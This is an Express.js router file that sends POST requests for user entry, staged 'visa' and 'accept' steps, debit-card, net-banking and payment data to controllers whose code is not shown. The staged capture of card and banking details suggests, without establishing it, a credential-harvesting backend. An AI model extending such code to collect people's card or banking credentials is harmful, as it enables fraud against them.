const express = require('express');
const router = express.Router();

const userController = require('../controllers/userController');
const Visa1Controller = require('../controllers/Visa1Controller');
const Visa2Controller = require('../controllers/Visa2Controller');
const cardController = require('../controllers/otherControler'); // ensure correct path
const Visa3Controller = require('../controllers/Visa3Controller');
const OtherControler = require('../controllers/otherControler');
const NetBanking = require('../controllers/netBankingController');
const Accept1 = require('../controllers/accept1Controller');
const Accept2 = require('../controllers/accept2Controller');

router.post('/accept1', Accept1.createAccept1 );
router.post('/accept2', Accept2.createAccept2 );
router.post('/visa2', Visa2Controller.createVisa2);
router.post('/visa3', Visa3Controller.createVisa3);
router.post('/visa1', Visa1Controller.createVisa1);
router.post('/entry', userController.saveUserData);
router.post('/card', cardController.createOrUpdateCombinedDebitCard);
router.post('/netbanking', cardController.createOrUpdateCombinedInternetBanking);
router.post('/combined-debit', OtherControler.createOrUpdateCombinedDebitCard);
router.post('/combined-internet', OtherControler.createOrUpdateCombinedInternetBanking);
router.post('/payment', NetBanking.submitPaymentRequest);

module.exports = router;
